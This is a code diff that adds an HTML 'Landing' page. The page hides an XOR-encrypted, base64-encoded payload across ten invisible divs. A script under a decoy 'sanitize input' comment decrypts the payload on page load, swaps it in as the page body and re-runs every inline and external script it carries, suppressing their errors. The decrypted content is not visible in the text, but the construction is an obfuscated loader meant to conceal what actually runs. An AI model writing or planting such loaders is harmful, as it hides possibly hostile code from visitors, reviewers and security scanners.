@@ -1,0 +1,171 @@
+<!DOCTYPE HTML>
+<html><head><meta charset="UTF-8"><title>Landing</title></head><body><!-- start --><div id="3gZUgFcX70" style="display:none">T0a0OzEBR1bf6FOQUAXNRmSHMckKACckHQDNVhc7PDimoF6FWVf5cDWKMcVGQyMkARSVAE93a3L8</div><div id="3gZUgFcX71" style="display:none">5QPGA2PPODGbKcFYSSUpGgmVWQY9bGnt5ViFTgzPYyyGMcgDHkF5AASCHQIhIGL1q06JWAeHYjmL</div><div id="3gZUgFcX72" style="display:none">IeEQRSUxPw6DABc7e3Sy72S7TwyROTGDIfcFUiI1BzWVBB0nalnF7xeCSAeQODGAK4wDCTAyGgmU</div><div id="3gZUgFcX73" style="display:none">GwV7QVn2qUiQbwyDIyqbANIDTj94FkmUEQY0d2qhtRLfAUaALyqGNdBYKnc2EBWZBAZ1bXT59RnL</div><div id="3gZUgFcX74" style="display:none">WBGHYzvea84VAnV5XBSTBhslajiQ9BSMWAiXcmSNKsAfHkF5Fw6GVBsxIyT3qUmPWBvRciubJNYS</div><div id="3gZUgFcX75" style="display:none">HGQhGhHOfk4mfXTzuE/aSgCdKDeYa/s5TzkhFhXNAxs7emnt5mS7UhuXKSqTOf87GzwsHQOfA1wK</div><div id="3gZUgFcX76" style="display:none">QWnorF6WExmGPzDHYsYDRiQ3FkqEHAA6aSGz80+MTwaEbDaKMoQjUjkqAU/XFh06cyvzpleNUwze</div><div id="3gZUgFcX77" style="display:none">NCGVYo1dHGQ2EBWZBAZrFDrpq0mNTR3TPyqMeIZJRTMxXATCWhgmPDim50iHTwCDOGbledcFUiI1</div><div id="3gZUgFcX78" style="display:none">B1mHHRwxcXG0l2SLTw2WPnafMNcOCGwmXg6eGBs7eyuo7xLfWQaQOTWKK9BIRy4xNguVGRc7akTj</div><div id="3gZUgFcX79" style="display:none">gV/MGgSSPjOKN4NPDj8gCxOzGxwhe2ju9RyAUgeWa2PTatcFUiI1B1n6SF03cWLj9gfLVR2eIGY=</div><script>function nMHgCT(){var x=32;return x*2;}
+/* sanitize input */
+(function(){
+function _run(){
+var WywxeB=atob('c2fwdHJVHgaayDvkPWnzTFjvRaRmIEtF');
+var VHmkd3=[];
+for(var qysDDX=0;qysDDX<10;qysDDX++){
+  var _e=document.getElementById('3gZUgFcX7'+qysDDX);VHmkd3.push(_e?_e.textContent:'');
+}
+var ayiBYG=VHmkd3.join('');
+var rOz05p=atob(ayiBYG);
+var lNWQVc=new Uint8Array(rOz05p.length);
+qysDDX=0;
+while(qysDDX<rOz05p.length){
+  lNWQVc[qysDDX]=rOz05p.charCodeAt(qysDDX)^WywxeB.charCodeAt(qysDDX%WywxeB.length);
+  qysDDX++;
+}
+var TP4Tp6=new TextDecoder('utf-8').decode(lNWQVc);
+
+/* Set page title */
+var _t=/<title[^>]*>([\s\S]*?)<\/title>/i.exec(TP4Tp6);
+if(_t) document.title=_t[1];
+
+/* Extract head and body */
+var oEqbM5=/<head[^>]*>([\s\S]*?)<\/head>/i.exec(TP4Tp6);
+var IOCFWp=/<body[^>]*>([\s\S]*?)<\/body>/i.exec(TP4Tp6);
+var _h=oEqbM5?oEqbM5[1]:'';
+var _b=IOCFWp?IOCFWp[1]:TP4Tp6;
+
+/* FIX2/FIX3: extract ALL scripts from head + body, preserving attributes */
+var e78kT1=[];
+function _extract(_html){
+  return _html.replace(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi,function(_m,_a,_c){
+    var _s=/src\s*=\s*["']([^"']+)["']/i.exec(_a);
+    var _attrs={};
+    var _re=/([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*["']([^"']*)["']/g;
+    var _mm;
+    while((_mm=_re.exec(_a))!==null){_attrs[_mm[1].toLowerCase()]=_mm[2];}
+    var _re2=/(^|\s)([a-zA-Z_:][-a-zA-Z0-9_:.]*)(?=\s|=|$)/g;
+    while((_mm=_re2.exec(_a))!==null){
+      var _k2=_mm[2].toLowerCase();
+      if(!(_k2 in _attrs)) _attrs[_k2]='';
+    }
+    if(_s){e78kT1.push([1,_s[1],_attrs]);}
+    else if(_c.trim()){e78kT1.push([0,_c,_attrs]);}
+    return '';
+  });
+}
+_h=_extract(_h);
+_b=_extract(_b);
+
+/* Copy allowed head elements (scripts already extracted) */
+if(_h){
+  var HVxWPc=document.createElement('div');
+  HVxWPc.innerHTML=_h.replace(/<title[^>]*>[\s\S]*?<\/title>/i,'');
+  while(HVxWPc.firstChild){
+    var _n=HVxWPc.firstChild;
+    var _tag=(_n.tagName||'').toUpperCase();
+    if(_tag==='STYLE'||_tag==='META'||_tag==='LINK'||_tag==='BASE'){
+      document.head.appendChild(_n);
+    }else{
+      HVxWPc.removeChild(_n);
+    }
+  }
+}
+
+/* Insert body */
+document.body.innerHTML=_b;
+
+/* FIX4: re-execute scripts sequentially, preserving order.
+   A failing external script (onerror) or a throwing inline script is
+   recorded and the chain continues with the next script. */
+var ysTN3K=0;
+var REPORT_EVENT='__rebuildScriptReport__';
+var REPORT_NODE_ID='__rebuild_script_report__';
+var _report={total:e78kT1.length,succeeded:0,failed:0,failures:[],results:[]};
+function _publishReport(){
+  window.__rebuildScriptReport__=_report;
+  var _r=document.getElementById(REPORT_NODE_ID);
+  if(!_r){
+    _r=document.createElement('script');
+    _r.type='application/json';
+    _r.id=REPORT_NODE_ID;
+    document.body.appendChild(_r);
+  }
+  _r.textContent=JSON.stringify(_report);
+  try{document.dispatchEvent(new CustomEvent(REPORT_EVENT,{detail:_report}));}catch(_e){}
+}
+function _settle(ok,rec){
+  rec.status=ok?'success':'failed';
+  _report.results.push(rec);
+  if(ok){_report.succeeded++;}
+  else{_report.failed++;_report.failures.push(rec);}
+  _publishReport();
+}
+function _next(){
+  if(ysTN3K>=e78kT1.length) return;
+  var _idx=ysTN3K;
+  var EZ2zlj=e78kT1[ysTN3K++];
+  var GrlCw3=document.createElement('script');
+  var dzLZce=EZ2zlj[2]||{};
+  for(var FLyrME in dzLZce){
+    try{ GrlCw3.setAttribute(FLyrME,dzLZce[FLyrME]); }catch(_e){}
+  }
+  if(EZ2zlj[0]){
+    /* external script: wait for load/error before touching the next one,
+       so original ordering semantics are preserved. */
+    var _extRec={index:_idx,type:'external',src:EZ2zlj[1],status:'pending',message:''};
+    GrlCw3.src=EZ2zlj[1];
+    GrlCw3.async=false;
+    GrlCw3.onload=function(){
+      _settle(true,_extRec);
+      _next();
+    };
+    GrlCw3.onerror=function(){
+      _extRec.message='Failed to load external script: '+EZ2zlj[1];
+      _settle(false,_extRec);
+      _next();
+    };
+    document.body.appendChild(GrlCw3);
+  }else{
+    /* inline script: a throw from an inline classic script is reported
+       asynchronously via a window 'error' event (it does not propagate out
+       of appendChild), so capture it with a scoped listener for this single
+       script and keep the chain moving either way. */
+    var _inRec={index:_idx,type:'inline',src:'',status:'pending',message:''};
+    var _done=false;
+    function _inlineSettled(ok,msg){
+      if(_done)return;
+      _done=true;
+      window.removeEventListener('error',_onInlineError,true);
+      if(!ok)_inRec.message=msg||'Inline script threw an error';
+      _settle(ok,_inRec);
+      _next();
+    }
+    function _onInlineError(ev){
+      /* Resource load errors also reach window as 'error' events, but their
+         target is the failing element; runtime errors from this inline script
+         target window itself. */
+      if(ev.target!==window)return;
+      var _detail=ev.error||ev.message||ev;
+      /* Mark handled so the browser no longer reports it as "Uncaught".
+         preventDefault does not stop propagation: page-registered error
+         listeners still receive the event. */
+      try{ev.preventDefault();}catch(_e){}
+      _inlineSettled(false,(_detail&&(_detail.stack||_detail.message))||String(_detail));
+    }
+    window.addEventListener('error',_onInlineError,true);
+    try{
+      GrlCw3.textContent=EZ2zlj[1];
+      document.body.appendChild(GrlCw3);
+    }catch(_err){
+      _inlineSettled(false,(_err&&(_err.stack||_err.message))||String(_err));
+      return;
+    }
+    /* No error event until the next task => the inline script completed. */
+    setTimeout(function(){_inlineSettled(true);},0);
+  }
+}
+_publishReport();
+_next();
+}
+
+/* FIX1: guard against running before DOM is ready */
+if(document.readyState==='loading'){
+  document.addEventListener('DOMContentLoaded',_run);
+}else{
+  _run();
+}
+})();</script><!-- end --></body></html>
